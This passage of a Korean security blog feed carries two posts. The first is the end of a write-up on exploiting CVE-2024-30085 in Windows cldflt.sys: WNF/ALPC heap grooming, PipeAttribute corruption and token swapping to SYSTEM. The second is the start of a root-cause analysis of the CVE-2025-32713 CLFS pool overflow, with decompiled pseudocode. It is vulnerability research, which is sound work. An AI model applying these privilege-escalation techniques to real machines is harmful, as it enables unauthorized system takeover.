&#xD799;&#xC5D0; Heap Hole &#xC0DD;&#xC131;.</li><li><strong>&#xCDE8;&#xC57D;&#xD55C; &#xBE44;&#xD2B8;&#xB9F5; &#xD30C;&#xC77C; &#xC624;&#xD508; &#xBC0F; &#xCCAB; &#xBC88;&#xC9F8; Overflow &#xD2B8;&#xB9AC;&#xAC70;</strong><br><code>CfRegisterSyncRoot()</code>&#xC640; Reparse Point &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC870;&#xC791;&#xC744; &#xD1B5;&#xD574; Sync Root &#xB0B4;&#xBD80;&#xC758; &#xCDE8;&#xC57D;&#xD55C; &#xBE44;&#xD2B8;&#xB9F5; &#xD30C;&#xC77C;&#xC744; &#xC900;&#xBE44;. &#xC774;&#xD6C4; <code>CreateFile()</code>&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; <code>IRP_MJ_CREATE()</code> &#x2192; <code>HsmFltPostCREATE()</code> &#x2192; <code>HsmiFltPostECPCREATE()</code> &#x2192; <code>HsmpSetupContexts()</code> &#x2192; <code>HsmpCtxCreateStreamContext()</code> &#x2192; <code>HsmIBitmapNORMALOpen()</code> &#xACBD;&#xB85C;&#xAE4C;&#xC9C0; &#xC9C4;&#xC785;&#xD558;&#xACE0;, Heap Overflow&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC811;&#xD55C; <code>WNF_STATE_DATA</code>&#xC758; DataSize&#xB97C; &#xBCC0;&#xC870;&#xD574; OOB R/W&#xB97C; &#xD655;&#xBCF4;.</li><li><strong>&#xCEE4;&#xB110; &#xD3EC;&#xC778;&#xD130; Leak</strong><br>&#xBCC0;&#xC870;&#xB41C; <code>WNF_STATE_DATA</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; <code>_KALPC_RESERVE</code> **&#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC77D;&#xC5B4; &#xCEE4;&#xB110; &#xC8FC;&#xC18C; Leak.</li><li><strong>&#xB450; &#xBC88;&#xC9F8; <code>WNF_STATE_DATA</code> Spray &#xBC0F; Hole &#xC0DD;&#xC131;</strong><br>&#xB2E4;&#xC2DC; &#xB3D9;&#xC77C; &#xD06C;&#xAE30;&#xC758; <code>WNF_STATE_DATA</code>&#xB97C; Spray&#xD558;&#xACE0; &#xD574;&#xC81C;&#xD574; Hole&#xC744; &#xB9CC;&#xB4E0; &#xD6C4;, &#xC774;&#xBC88;&#xC5D0;&#xB294; <code>PipeAttribute</code> &#xAD6C;&#xC870;&#xC640; &#xC778;&#xC811;&#xD55C; &#xC601;&#xC5ED;&#xC5D0; WNF &#xAC1D;&#xCCB4;&#xAC00; &#xBC30;&#xCE58;&#xB418;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;.</li><li><strong>&#xB450; &#xBC88;&#xC9F8; Overflow&#xB97C; &#xD1B5;&#xD574; <code>PipeAttribute</code> &#xC870;&#xC791;</strong><br>&#xB450; &#xBC88;&#xC9F8; &#xBE44;&#xD2B8;&#xB9F5; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; Heap Overflow&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xACE0;, &#xC778;&#xC811;&#xD55C; <code>PipeAttribute</code>&#xC758; <code>Flink</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xC790; &#xACF5;&#xAC04; Fake <code>PipeAttribute</code> &#xAD6C;&#xC870;&#xCCB4; &#xC8FC;&#xC18C;&#xB85C; &#xB36E;&#xC74C;.</li><li><strong>Arbitrary Read &#xAD6C;&#xC131; &#xBC0F; EPROCESS/Token &#xC8FC;&#xC18C; &#xD68D;&#xB4DD;</strong><br>Fake <code>PipeAttribute</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; ALPC Port &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0;, &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xB300;&#xC0C1; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; EPROCESS &#xC8FC;&#xC18C;&#xC640; Token &#xC8FC;&#xC18C;&#xB97C; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; read.</li><li><strong>Token Swapping &#xBC0F; SYSTEM &#xAD8C;&#xD55C; &#xD68D;&#xB4DD;</strong><br>Arbitrary Write&#xB97C; &#xD1B5;&#xD574; &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Token &#xAC12;&#xC744; SYSTEM Token &#xAC12;&#xC73C;&#xB85C; &#xAD50;&#xCCB4;&#xD558;&#xACE0;, SYSTEM &#xAD8C;&#xD55C;&#xC758; <code>cmd.exe</code>&#xB97C; &#xC2E4;&#xD589;.</li></ol><h3 id="ALPC-WNF"><a href="#ALPC-WNF" class="headerlink" title="ALPC/WNF"></a>ALPC/WNF</h3><p><code>_WNF_STATE_DATA</code>&#xC640; <code>_ALPC_HANDLE_TABLE</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC774;&#xC6A9;&#xD574; Heap Hole&#xC744; &#xC704;&#xD55C; Arbitrary size &#xCEE4;&#xB110; &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0;, &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; leak&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370;&#xC694;. &#xC544;&#xB9C8;&#xB3C4; ALPC&#xC640; WNF &#xAC1C;&#xB150;&#xC774; &#xC0DD;&#xC18C;&#xD558;&#xC2E4; &#xAC81;&#xB2C8;&#xB2E4;. exploit&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574; &#xB450; sub system&#xC744; &#xC124;&#xBA85;&#xD574;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>ALPC (Asynchronous Local Procedure Call)</strong></p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image13.webp" alt></p><p>ALPC&#xB294; Windows &#xCEE4;&#xB110; &#xB0B4;&#xBD80;&#xC758; IPC &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC73C;&#xB85C;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC11C;&#xBC84; &#xD3EC;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD574; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC8FC;&#xACE0;&#xBC1B;&#xB294; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; ALPC&#xC758; HANDLE TABLE&#xC758; <code>_ALPC_HANDLE_ENTRY</code>&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xBA54;&#xC2DC;&#xC9C0; &#xBC84;&#xD37C; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;, &#xC774; TABLE&#xC758; &#xD06C;&#xAE30;&#xB294; &#xAC00;&#xBCC0;&#xC801;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Arbitrary &#xD06C;&#xAE30;&#xC758; &#xCEE4;&#xB110; &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;!</p><ul><li>ALPC &#xD3EC;&#xD2B8; &#xC0DD;&#xC131; &#xC2DC; <code>_ALPC_HANDLE_TABLE</code>&#xC774; <strong>paged pool</strong>&#xC5D0; 0x80 &#xD06C;&#xAE30;&#xB85C; &#xD560;&#xB2F9;&#xB428;</li><li><code>NtAlpcCreateResourceReserve</code> &#xD638;&#xCD9C; &#xC2DC;&#xB9C8;&#xB2E4; <code>_KALPC_RESERVE</code> &#xAC1D;&#xCCB4;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xACE0; &#xC774; &#xC8FC;&#xC18C;&#xAC00; HANDLE TABLE&#xC5D0; &#xCD94;&#xAC00;&#xB428;</li><li><p>&#xC774; &#xAD6C;&#xC870;&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xBA74; &#xC784;&#xC758; &#xCEE4;&#xB110; &#xC8FC;&#xC18C; Read/Write primitive &#xAC00;&#xB2A5;</p><p>  &#x2192; PoC&#xC5D0;&#xC11C;&#xB294; fake <code>_KALPC_RESERVE</code>&#xB97C; &#xC8FC;&#xC785;&#xD574; arbitrary R/W &#xB2EC;&#xC131;</p></li><li><p>ALPC HANDLE&#xC740; User-Mode&#xC5D0;&#xC11C;&#xB3C4; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5; &#x2192; exploit&#xC5D0; &#xC6A9;&#xC774;&#xD574;&#xC9D0;</p></li></ul><blockquote><p><strong>WNF (Windows Notification Facility)</strong></p></blockquote><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image14.webp" alt></p><p>WNF&#xB294; Windows&#xC758; &#xC54C;&#xB9BC; &#xC2DC;&#xC2A4;&#xD15C;&#xC778;&#xB370;&#xC694;. WNF_NAME_INSTANCE &#xCEE4;&#xB110; &#xAC1D;&#xCCB4;&#xB294; &#xB0B4;&#xBD80;&#xC5D0; _WNF_STATE_DATA&#xB77C;&#xB294; &#xD544;&#xB4DC;&#xB97C; &#xAC00;&#xC9C0;&#xB294;&#xB370; &#xC774; &#xD06C;&#xAE30;&#xB294; &#xAC00;&#xBCC0;&#xC801;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; User-Mode&#xC5D0;&#xC11C; <code>NtCreateWnfStateName</code> + <code>NtUpdateWnfStateData</code>&#xB85C; &#xC9C1;&#xC811; &#xCEE4;&#xB110; &#xAC1D;&#xCCB4; &#xD06C;&#xAE30; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><code>_WNF_STATE_DATA</code>&#xB294; 0x1000 &#xD06C;&#xAE30;&#xB85C; &#xD560;&#xB2F9; &#xAC00;&#xB2A5; (0x10 header + 0xFF0 data)</li><li>heap spraying &#xC6A9;&#xB3C4;&#xB85C; WNF &#xAC1D;&#xCCB4;&#xB97C; &#xB2E4;&#xB7C9; &#xC0DD;&#xC131;&#xD574;, &#xBAA9;&#xD45C; &#xAD6C;&#xC870;&#xCCB4;(ALPC &#xAC1D;&#xCCB4;)&#xC640; &#xC778;&#xC811;&#xD558;&#xAC8C; &#xBC30;&#xCE58;</li><li>PoC&#xC5D0;&#xC11C;&#xB294; WNF&#xB97C; &#xC774;&#xC6A9;&#xD574; heap hole&#xC744; &#xB9CC;&#xB4E4;&#xACE0; ALPC &#xAC1D;&#xCCB4; &#xC778;&#xC811;&#xC5D0; &#xBC30;&#xCE58;&#xD558;&#xC5EC; ALPC HANDLE TABLE&#xC5D0; Overflow &#xC720;&#xB3C4;</li></ul><p>&#xD2B9;&#xD788; PoC&#xC5D0;&#xC11C;&#xB294; Pipe&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC744; &#xB4F1;&#xB85D;&#xD574;&#xC57C; &#xD588;&#xB294;&#xB370;, &#xC800;&#xB294; &#xC774; &#xBD80;&#xBD84;&#xC774; &#xD765;&#xBBF8;&#xB85C;&#xC6E0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PipeAttribute</span> {</span>     LIST_ENTRY <span class="hljs-built_in">list</span>;     <span class="hljs-keyword">char</span> * AttributeName;     <span class="hljs-keyword">uint64_t</span> AttributeValueSize;     <span class="hljs-keyword">char</span> * AttributeValue;     <span class="hljs-keyword">char</span> data[<span class="hljs-number">0</span>];}</code></pre><p>Pipe&#xB294; &#xBCC0;&#xC870;&#xB41C; <code>PipeAttribute</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; Value &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB85C; &#xC138;&#xD305;&#xD574; &#xCEE4;&#xB110;&#xC774; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; &#xCC38;&#xC870;&#xD574; &#xC77D;&#xC740; &#xB370;&#xC774;&#xD130;&#xB97C; User-Mode &#xACF5;&#xAC04;&#xC5D0; &#xBC18;&#xD658;&#xD574;&#xC904; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294;&#xB370;&#xC694;. &#xC774;&#xB85C;&#xC368; ALPC&#xB85C; &#xD655;&#xBCF4;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xACFC; WNF Overflow &#xC870;&#xD569;&#xC744; &#xC774;&#xC6A9;&#xD574; Pipe&#xB97C; Arbitrary Read primitive&#xB85C; &#xC804;&#xD658;&#xD574; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB97C; leak&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;!</p><h2 id="3-&#xB9C8;&#xBB34;&#xB9AC;"><a href="#3-&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="3. &#xB9C8;&#xBB34;&#xB9AC;"></a>3. &#xB9C8;&#xBB34;&#xB9AC;</h2><hr><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image15.gif" alt></p><p>&#xB9C8;&#xBB34;&#xB9AC;&#xB294; &#xC81C;&#xAC00; <code>cldflt.sys</code>&#xC758; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD2B9;&#xC131;, &#xADF8;&#xB9AC;&#xACE0; WNF + ALPC &#xAE30;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xAD6C;&#xD604;&#xD55C; LPE &#xACB0;&#xACFC;&#xB97C; &#xBCF4;&#xC5EC;&#xB4DC;&#xB9AC;&#xBA70; &#xB05D;&#xB0B4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. Minifilter&#xC744; &#xACF5;&#xBD80;&#xD558;&#xBA74;&#xC11C; &#xB290;&#xB080; &#xC810;&#xC740;.. &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xC774;&#xB098; &#xD568;&#xC218;, &#xAC1C;&#xB150; &#xC790;&#xCCB4;&#xB294; &#xC870;&#xAE08; &#xC0DD;&#xC18C;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC;, &#xACB0;&#xAD6D;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294; &#xBC29;&#xC2DD;&#xC774;&#xB098; &#xB8E8;&#xD2B8; &#xCEE4;&#xC988; &#xC6D0;&#xB9AC;&#xB294; &#xBE44;&#xC2B7;&#xBE44;&#xC2B7;&#xD558;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4E4;&#xC5C8;&#xB124;&#xC694;&#x2026; &#xADF8;&#xB7EC;&#xB2C8; Minifilter &#xC9C4;&#xC785;&#xC5D0; &#xB108;&#xBB34; &#xAC81; &#xBA39;&#xC9C0; &#xC54A;&#xC73C;&#xC154;&#xB3C4; &#xB420; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!!</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB3C4; &#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; &#xC544;&#xC9C1; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xC9C0; &#xC54A;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xB124;&#xC694;.. &#xB2E4;&#xC74C; &#xAE00;&#xB3C4; &#xB9CE;&#xC740; &#xAE30;&#xB300; &#xBD80;&#xD0C1;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h1><hr><p><a href="https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/">https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/</a></p><p><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts">https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts</a></p><p><a href="https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/">https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/</a></p><p><a href="https://ssd-disclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/">https://ssd-disclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/</a></p><p><a href="https://reddogsecurity.substack.com/p/elevating-privileges-in-windows-insights?r=5awqb0&amp;utm_campaign=post&amp;utm_medium=web&amp;triedRedirect=true">https://reddogsecurity.substack.com/p/elevating-privileges-in-windows-insights?r=5awqb0&amp;utm_campaign=post&amp;utm_medium=web&amp;triedRedirect=true</a></p><p><a href="https://medium.com/@WaterBucket/understanding-mini-filter-drivers-for-windows-vulnerability-research-exploit-development-391153c945d6">https://medium.com/@WaterBucket/understanding-mini-filter-drivers-for-windows-vulnerability-research-exploit-development-391153c945d6</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/Minifilter/">Minifilter</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-30085/">CVE-2024-30085</category>
      
      <category domain="https://hackyboiz.github.io/tags/CldFlt/">CldFlt</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/15/banda/Minifilter-Driver/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025–32713: Windows Common Log File System Driver Local Privilege Escalation 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/13/ogu123/cve-2025%E2%80%9332713/</link>
      <guid>https://hackyboiz.github.io/2025/08/13/ogu123/cve-2025%E2%80%9332713/</guid>
      <pubDate>Wed, 13 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://medium.com/s2wblog/analysis-of-windows-comm</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://medium.com/s2wblog/analysis-of-windows-common-log-file-system-driver-vulnerability-cve-2025-32713-97422b699d54">https://medium.com/s2wblog/analysis-of-windows-common-log-file-system-driver-vulnerability-cve-2025-32713-97422b699d54</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2025&#xB144; 6&#xC6D4; &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC774;&#xC804; clfs.sys &#xD30C;&#xC77C;<ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32713">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32713</a></li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Common Log File System&#xC5D0;&#xC11C; Pool Overflow&#xB85C; &#xC778;&#xD55C; LPE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB85C;&#xADF8; &#xBE14;&#xB85D;(Log Block)&#xC744; &#xC77D;&#xC744; &#xB54C; ClfsContextForward&#xAC00; &#xC544;&#xB2CC; &#xB2E4;&#xB978; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xBAA8;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0;, &#xB17C;&#xB9AC; &#xC139;&#xD130; &#xD06C;&#xAE30;(Logical Sector Size)&#xAC00; 512byte&#xBCF4;&#xB2E4; &#xD070; &#xBCFC;&#xB968;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; CLFS&#xC5D0;&#xC11C; &#xB85C;&#xADF8; &#xB808;&#xCF54;&#xB4DC;&#xB97C; &#xC77D;&#xAE30; &#xC804; &#xC544;&#xB798; &#xC21C;&#xC11C;&#xB97C; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xB85C;&#xADF8; &#xB9C8;&#xC0EC;&#xB9C1; &#xC601;&#xC5ED;(Log Marshalling Area) &#xC0DD;&#xC131;</strong><ul><li><code>CreateLogMarshallingArea</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xB85C;&#xADF8; &#xB9C8;&#xC0EC;&#xB9C1; &#xC601;&#xC5ED;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD574;&#xB2F9; &#xC601;&#xC5ED;&#xC740; &#xB85C;&#xADF8; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC62E;&#xAE30;&#xACE0; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC791;&#xC5C5; &#xACF5;&#xAC04; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>&#xB85C;&#xADF8; &#xB808;&#xCF54;&#xB4DC; &#xC77D;&#xAE30;</strong><ul><li>&#xC774;&#xD6C4;, <code>ReadLogRecord</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xB9C8;&#xC0EC;&#xB9C1; &#xC601;&#xC5ED;&#xC758; &#xD578;&#xB4E4;&#xACFC; &#xC77D;&#xACE0; &#xC2F6;&#xC740; &#xB85C;&#xADF8; &#xB808;&#xCF54;&#xB4DC;&#xC758; &#xC2DC;&#xD000;&#xC2A4; &#xBC88;&#xD638;(Log Sequence Number)&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC5EC;&#xAE30;&#xC11C; &#xC2DC;&#xD000;&#xC2A4; &#xBC88;&#xD638;&#xB294; &#xB85C;&#xADF8; &#xB370;&#xC774;&#xD130; &#xBA87; &#xBC88;&#xC9F8;&#xB97C; &#xC77D;&#xC744;&#xC9C0;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xBC88;&#xD638;&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li></ol><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a><strong>Root Cause</strong></h3><p>CLFS &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xD30C;&#xC77C; &#xB0B4;&#xC5D0; &#xB85C;&#xADF8; &#xB808;&#xCF54;&#xB4DC;&#xB97C; &#xC77D;&#xC744; &#xB54C;, <code>CClfsLogFcbPhysical::ReadLogBlock</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// Pseudo code of CClfsLogFcbPhysical::ReadLogBlock function</span><span class="hljs-comment">// Execution flows not related to the bug are omitted.</span><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CClfsLogFcbPhysical::ReadLogBlock</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        CClfsLogFcbPhysical *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">        struct _FILE_OBJECT *CachedFileObject,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">union</span> _CLS_LSN *a3,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> struct _CLFS_READ_BUFFER *a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a6,</span></span><span class="hljs-function"><span class="hljs-params">        struct IClfsRequestAsync *a7,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">char</span> a8,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">union</span> _CLS_LSN *a9,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a10)</span></span><span class="hljs-function"></span>{  ...  **v75 = a4;**  ...  **<span class="hljs-comment">// Get sector size of the volume which contains log container**</span>  **<span class="hljs-comment">// This value is set during execution of CClfsBaseFilePersisted::OpenImage function**</span>  **_ContainerRawSectorSize = <span class="hljs-keyword">this</span>-&gt;BaseFilePersisted-&gt;ContainerRawSectorSize;**  **ContainerRawSectorSize = _ContainerRawSectorSize;**  ...  **v64 = *(_OWORD *)a5;**  ...  Address = (struct _CLFS_LOG_BLOCK_HEADER *)_CLFS_READ_BUFFER::GetAddress(a5);  ...  <span class="hljs-keyword">if</span> ( Address )  {    **Buffer = _CLFS_READ_BUFFER::GetAddress((_CLFS_READ_BUFFER *)&amp;v64);**    <span class="hljs-keyword">if</span> ( Buffer )    {      ...      <span class="hljs-keyword">if</span> ( (_BYTE)v52        || CachedFileObject-&gt;PrivateCacheMap        || (v13 = (*(__int64 (__fastcall **)(CClfsLogFcbPhysical *, struct _FILE_OBJECT *, CClfsLogFcbPhysical *))<span class="hljs-keyword">this</span>-&gt;field_0)(                    <span class="hljs-keyword">this</span>,                    CachedFileObject,                    <span class="hljs-keyword">this</span>),            v13 &gt;= <span class="hljs-number">0</span>) )      {        ...        <span class="hljs-keyword">if</span> ( (*(<span class="hljs-keyword">unsigned</span> __int8 (__fastcall **)(CClfsLogFcbPhysical *))(<span class="hljs-keyword">this</span>-&gt;field_0 + <span class="hljs-number">312</span>))(<span class="hljs-keyword">this</span>) &amp;&amp; (a8 &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )        {          ...        }        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">this</span>-&gt;field_168 &amp; <span class="hljs-number">0x100000000000</span>i64) != <span class="hljs-number">0</span> )        {          ...        }        <span class="hljs-keyword">else</span>        {          ...          <span class="hljs-keyword">if</span> ( a3 &amp;&amp; a3-&gt;ullOffset &lt; (<span class="hljs-keyword">unsigned</span> __int64)v20 )          {            ...          }          <span class="hljs-keyword">else</span>          {            ...            <span class="hljs-keyword">if</span> ( !(<span class="hljs-keyword">unsigned</span> __int8)<span class="hljs-keyword">operator</span>&gt;=(a3, &amp;<span class="hljs-keyword">this</span>-&gt;field_1E0) )            {              ...              <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )              {                ...                <span class="hljs-keyword">if</span> ( **(v75 &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>** ) **<span class="hljs-comment">// [1] Check the fourth argument**</span>                {                  v45 = <span class="hljs-number">0</span>;                  <span class="hljs-keyword">if</span> ( !*a10 ) **<span class="hljs-comment">// It is true when entering the loop for the first time**</span>                  {                    **Length = ContainerRawSectorSize; <span class="hljs-comment">// Set Length as sector size**</span>                    ...                  }                }                <span class="hljs-keyword">if</span> ( (_BYTE)v52 )                {                  ...                }                <span class="hljs-keyword">else</span>                {                  ...                  <span class="hljs-keyword">if</span> ( FileOffset.HighPart &lt; <span class="hljs-number">0</span> || v34 &lt; <span class="hljs-number">0</span> )                    ...                  <span class="hljs-keyword">if</span> ( v34 &lt; v33.QuadPart + Length )                  {                    ...                  }                  v59.ullOffset = <span class="hljs-number">0</span>i64;                  <span class="hljs-keyword">if</span> ( v33.QuadPart &lt; <span class="hljs-number">0</span>                    || (<span class="hljs-keyword">int</span>)RtlLongLongAdd(v33.QuadPart, Length, (__int64 *)&amp;v59) &lt; <span class="hljs-number">0</span>                    || (__int64)v59.ullOffset &gt; <span class="hljs-keyword">this</span>-&gt;field_50 )                  {                    ...                  }                  <span class="hljs-comment">// [2] **Pool overflow will occur if Length (sector size) is larger than the size of Buffer**</span>                  <span class="hljs-keyword">if</span> ( **CcCopyRead**(CachedFileObject, &amp;FileOffset, **Length**, <span class="hljs-number">1u</span>, **Buffer**, &amp;IoStatus) )                  {                    ...                  }[...]</code></pre><p><code>CClfsLogFcbPhysical::ReadLogBlock</code> &#xD568;&#xC218;&#xC758; &#xB124; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xAC00; 1&#xB85C; &#xC124;&#xC815;&#xB41C; &#xACBD;&#xC6B0; &#xC544;&#xB798;&#xC640; 